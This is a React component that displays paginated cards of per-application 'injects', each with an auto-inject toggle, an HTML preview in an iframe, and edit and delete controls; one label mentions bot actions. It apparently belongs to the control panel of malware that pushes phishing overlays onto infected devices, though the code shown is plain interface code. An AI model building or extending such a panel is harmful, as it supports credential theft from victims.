import React from "react";
import {Inject} from "../../../Model/Inject";
import {Button, Col, Divider, Modal, Pagination, Row, Space, Switch, Tooltip} from "antd";
import {useTranslation} from "react-i18next";
import {deleteInjects, setAutoInject} from "../../../Store/Injections/Actions";
import {hasAccess} from "../../../Util/hasAccess";
import {DeleteFilled, EditFilled} from "@ant-design/icons";
import {AppState} from "../../../Store/RootReducer";
import {getBackendUrl} from "../../../Util/config";
import Spinner from "../../Misc/Spinner";
import {useAppDispatch} from "../../../Hook/useAppDispatch";
import {useAppSelector} from "../../../Hook/useAppSelector";

interface InjectionsProps {
    inject: Inject[],
    paginationHandler: (pageNumber: number, size: number) => void,
    showEditInjectModal: boolean,
    setShowEditInjectModal: (inject: Inject) => void,
    isLoaded: boolean,
}

const InjectionsCards: React.FC<InjectionsProps> = (props: InjectionsProps) => {
    const {t} = useTranslation();
    const dispatch = useAppDispatch();

    const authReducer = useAppSelector((state: AppState) => state.auth);
    const injectionsReducer = useAppSelector((state: AppState) => state.injects);

    return (
        <div className="panel-content">
            <Pagination
                style={{marginBottom: 15}}
                onChange={props.paginationHandler}
                total={injectionsReducer.total}
                defaultPageSize={injectionsReducer.per_page}
                current={injectionsReducer.page}
                showSizeChanger={true}
                locale={{
                    items_per_page: "",
                }}
            />

            {props.isLoaded ? (
                <Row gutter={15}>
                    {props.inject.map((inject, key) => {
                        return (
                            <Col xxl={6} xl={8} md={12} sm={24} xs={24} key={key} style={{marginBottom: 15}}>
                                <div className="inject-card">
                                    <div>
                                        <div className="inject-head" style={{marginTop: 0}}>
                                            <div>
                                                <div>
                                                    <Space>
                                                        <div className="app-icon" style={{
                                                            backgroundImage: `url(${getBackendUrl(inject.image)})`,
                                                        }} />

                                                        <span>{inject.application}</span>
                                                    </Space>
                                                </div>
                                                <div>
                                                    <span>ID: [#{inject.id}]</span>
                                                </div>
                                            </div>
                                            <Space direction="vertical" align="center">
                                                {/* <div style={{lineHeight: 0, fontSize: 10}}>autoinject</div> */}
                                                <Tooltip title={t("AUTO_INJECT")}>
                                                    <Switch
                                                        defaultChecked={inject.auto}
                                                        onChange={(value: boolean) => {
                                                            dispatch(setAutoInject(inject.id, value));
                                                        }}
                                                        title={t("AUTO_INJECT")}
                                                    />
                                                </Tooltip>
                                            </Space>
                                        </div>

                                        <div className="inject-content">
                                            <Divider style={{margin: "15px 0 0"}}>{t("DATA")}</Divider>

                                            <Row gutter={5}>
                                                <Col span={12}>
                                                    <div>
                                                        <b>{t("NAME")}:</b> {inject.name}
                                                    </div>
                                                </Col>
                                                <Col span={12}>
                                                    <div><b>{t("TYPE")}:</b> {inject.type}</div>
                                                </Col>
                                                <Col span={24}>

                                                </Col>
                                            </Row>
                                        </div>
                                    </div>
                                    <div>
                                        <Divider>{t("INJ_COLUMN_ACTIONS")}</Divider>

                                        <Space>
                                            <Button
                                                icon={(
                                                    <span className="anticon">
                                                        <i className="fa-solid fa-file" />
                                                    </span>
                                                )}
                                                type="primary"
                                                onClick={() => {
                                                    Modal.info({
                                                        title: (
                                                            <div className="inject-modal-header">
                                                                <Space>
                                                                    <div
                                                                        className="app-icon"
                                                                        style={{
                                                                            backgroundImage: `url(${getBackendUrl(inject.image)})`,
                                                                        }}
                                                                    />

                                                                    <span>{inject.application}</span>
                                                                    <span>-</span>
                                                                    <span>{inject.name}</span>
                                                                </Space>
                                                            </div>
                                                        ),
                                                        icon: null,
                                                        content: (
                                                            <div
                                                                style={{
                                                                    margin: "0 -32px",
                                                                }}
                                                            >
                                                                <iframe
                                                                    src={getBackendUrl(inject.html) + "?" + Date.now()}
                                                                    title="Inject title"
                                                                    frameBorder="0"
                                                                    width="100%"
                                                                    height={600}
                                                                />
                                                            </div>
                                                        ),
                                                        closable: true,
                                                        className: "modal-inject-style",
                                                        okText: t("CLOSE"),
                                                    });
                                                }}
                                            >
                                                {t("SHOW_INJECT_HTML")}
                                            </Button>
                                            {hasAccess(authReducer.user, "injections.edit") && (
                                                <Button
                                                    type="primary"
                                                    shape="circle"
                                                    icon={<EditFilled />}
                                                    onClick={() => props.setShowEditInjectModal(inject)}
                                                />
                                            )}
                                            {hasAccess(authReducer.user, "injections.delete") && (
                                                <Button
                                                    type="primary"
                                                    shape="circle"
                                                    icon={<DeleteFilled />}
                                                    danger
                                                    onClick={() => {
                                                        Modal.confirm({
                                                            title: t("INJECT_DELETE"),
                                                            content: t("UNDONE_ACTION"),
                                                            okText: t("BOT_ACTION_DELETE_CONFIRM"),
                                                            cancelText: t("MODAL_BUTTON_CANCEL"),
                                                            okButtonProps: {
                                                                danger: true,
                                                            },
                                                            onOk: () => {
                                                                dispatch(deleteInjects([inject.id]));
                                                            },
                                                        });
                                                    }}
                                                />
                                            )}
                                        </Space>
                                    </div>
                                </div>
                            </Col>
                        );
                    })}
                </Row>
            ) : (
                <Spinner />
            )}
        </div>
    );
};

export default InjectionsCards;
